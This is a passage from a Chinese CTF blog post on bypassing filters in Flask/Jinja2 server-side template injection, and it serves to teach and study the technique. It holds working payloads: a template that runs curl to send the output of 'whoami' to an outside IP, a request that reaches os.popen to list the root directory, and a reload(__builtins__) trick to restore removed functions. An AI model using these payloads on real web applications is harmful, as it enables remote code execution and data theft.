&#39;rsplit&#39;, &#39;rstrip&#39;, &#39;split&#39;, &#39;splitlines&#39;, &#39;startswith&#39;, &#39;strip&#39;, &#39;swapcase&#39;, &#39;title&#39;, &#39;translate&#39;, &#39;upper&#39;, &#39;zfill&#39;]</span><br></pre></td></tr></table></figure>
+
+<p><code>以上即为str的原生函数，我们可以使用decode、replace等来绕过所过滤的关键字。</code></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20191207110225-ff255dea-189d-1.jpg" alt="img"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20191207110226-ff644b86-189d-1.jpg" alt="img"></p>
+<h4 id="模块阉割"><a href="#模块阉割" class="headerlink" title="模块阉割"></a>模块阉割</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在比赛环境中，经常会阉割掉一些内置函数，我们可以尝试使用reload来重载。</span><br><span class="line"></span><br><span class="line">在Python2中，reload是内置函数，而在Python3中，reload则为imp module下的函数，使用方法：</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20191207110226-ff8f7360-189d-1.jpg" alt="img"></p>
+<p>测试</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210406191031.jpeg"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在比赛场景中我们一般是不能直接reload(os)的，因为可能当前类并没有import os。</span><br><span class="line"></span><br><span class="line">所以一般都是&#96;reload(__builtins__)&#96;，这时可以重新载入**builtins**，此时**builtins**中被删除的比如eval、**import**等就又都回来了。</span><br><span class="line"></span><br><span class="line">reload()主要用于沙盒环境中，比如直接给你提供了一个shell的环境，SSTI中我还没有成功使用过reload()。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="过滤花括号"><a href="#过滤花括号" class="headerlink" title="过滤花括号"></a>过滤花括号</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;xx.xxx.xx.xx:8080&#x2F;?i&#x3D;&#96;whoami&#96;&#39;).read()&#x3D;&#x3D;&#39;p&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;相当于把命令执行的结果外带出去。&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="过滤点号"><a href="#过滤点号" class="headerlink" title="过滤点号"></a>过滤点号</h4><p><code>在Python环境中(Python2/Python3)，我们可以使用访问字典的方式来访问函数/类等。</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__等价于&quot;&quot;[&#39;__cl&#39;+&#39;ass__&#39;]</span><br></pre></td></tr></table></figure>
+
+<p><code>利用上述方式，可以绕过点号的过滤，懒得本地复现了，直接丢之前遇到点号过滤的时候绕过的笔记：</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclass&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__ HTTP&#x2F;1.1</span><br><span class="line">Host: 114.116.44.23:58470</span><br><span class="line">Content-Length: 190</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Origin: http:&#x2F;&#x2F;114.116.44.23:58470</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;78.0.3904.70 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">Referer: http:&#x2F;&#x2F;114.116.44.23:58470&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">nickname&#x3D;&#123;&#123;&quot;&quot;[request[&quot;args&quot;][&quot;class&quot;]][request[&quot;args&quot;][&quot;mro&quot;]][1][request[&quot;args&quot;][&quot;subclass&quot;]]()[286][request[&quot;args&quot;][&quot;init&quot;]][request[&quot;args&quot;][&quot;globals&quot;]][&quot;os&quot;][&quot;popen&quot;](&quot;ls &#x2F;&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;基本的过滤也就只有这些了，剩下的待挖掘的其实就只剩下可以命令执行的module了。&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;[SSTI&#x2F;沙盒逃逸详细总结](https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;188172)&#96;</span><br><span class="line">&#96;[Flask&#x2F;Jinja2模板注入中的一些绕过姿势](https:&#x2F;&#x2F;p0sec.net&#x2F;index.php&#x2F;archives&#x2F;120&#x2F;)&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210408171427.png" alt="image-20210408171420755"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">Hi young boy!&lt;&#x2F;br&gt;</span><br><span class="line">Do you like ssti?&lt;&#x2F;br&gt;</span><br><span class="line"></span><br><span class="line">blacklist&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;&#x2F;br&gt;   </span><br><span class="line">&#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;&#x2F;br&gt;    </span><br><span class="line">&lt;&#x2F;br&gt;   </span><br><span class="line"></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>把过滤显示出来了！</p>
+<p>哪构造把！</p>
+<p>数字被过滤了可以使用这些特殊的数字来绕过</p>
+<p>然后就可以使用<code>join</code>进行拼接构造出一些我们想要的字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;%set i&#x3D;(dict(dir&#x3D;aa)|join)|join%&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">upload</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://upload.love/2021/03/31/ssti/">http://upload.love/2021/03/31/ssti/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://upload.love" target="_blank">upload</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ssti/">ssti</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive//Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/04/06/%E7%BA%A2%E5%8F%A4%E6%9D%AF/"><img class="prev-cover" data-lazy-src="/image/hgb.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">红古杯</div></div></a></div><div class="next-post pull-right"><a href="/2021/03/28/java%E6%BC%8F%E6%B4%9E/"><img class="next-cover" data-lazy-src="https://image.3001.net/images/20151223/14508499822138.png!small" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/20/BUUCTF-13/" title="BUUCTF13"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-20</div><div class="title">BUUCTF13</div></div></a></div><div><a href="/2021/01/04/BUUCTF-4/" title="BUUCTF4"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-04</div><div class="title">BUUCTF4</div></div></a></div><div><a href="/2021/01/03/BUUCTF-3/" title="BUUCTF3"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-03</div><div class="title">BUUCTF3</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">upload</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">196</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">136</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Learning"><span class="toc-number">2.</span> <span class="toc-text">Learning</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF-amp-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">什么是模板&amp;模板注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#How2use"><span class="toc-number">2.2.</span> <span class="toc-text">How2use</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-in-CTF"><span class="toc-number">2.3.</span> <span class="toc-text">Bypass in CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="toc-number">2.3.1.</span> <span class="toc-text">过滤引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7"><span class="toc-number">2.3.2.</span> <span class="toc-text">过滤中括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%B0%8F%E6%8B%AC%E5%8F%B7"><span class="toc-number">2.3.3.</span> <span class="toc-text">过滤小括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">2.3.4.</span> <span class="toc-text">过滤关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E9%98%89%E5%89%B2"><span class="toc-number">2.3.5.</span> <span class="toc-text">模块阉割</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="toc-number">2.3.6.</span> <span class="toc-text">过滤花括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%82%B9%E5%8F%B7"><span class="toc-number">2.3.7.</span> <span class="toc-text">过滤点号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number"></span> <span class="toc-text">例题</span></a></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计4"/></a><div class="content"><a class="title" href="/2021/11/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A14/" title="java代码审计4">java代码审计4</a><time datetime="2021-11-08T08:49:09.000Z" title="发表于 2021-11-08 16:49:09">2021-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计3"/></a><div class="content"><a class="title" href="/2021/11/05/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A13/" title="java代码审计3">java代码审计3</a><time datetime="2021-11-05T02:37:46.000Z" title="发表于 2021-11-05 10:37:46">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计2"/></a><div class="content"><a class="title" href="/2021/11/01/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A12/" title="java代码审计2">java代码审计2</a><time datetime="2021-11-01T13:08:39.000Z" title="发表于 2021-11-01 21:08:39">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="东华杯"/></a><div class="content"><a class="title" href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/" title="东华杯">东华杯</a><time datetime="2021-11-01T04:27:51.000Z" title="发表于 2021-11-01 12:27:51">2021-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1"><img data-lazy-src="/image/buu.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="java代码审计1"/></a><div class="content"><a class="title" href="/2021/10/31/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/" title="java代码审计1">java代码审计1</a><time datetime="2021-10-31T08:49:36.000Z" title="发表于 2021-10-31 16:49:36">2021-10-31</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2026 By upload</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://upload.love/2021/03/31/ssti/'
+    this.page.identifier = '2021/03/31/ssti/'
+    this.page.title = 'ssti'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
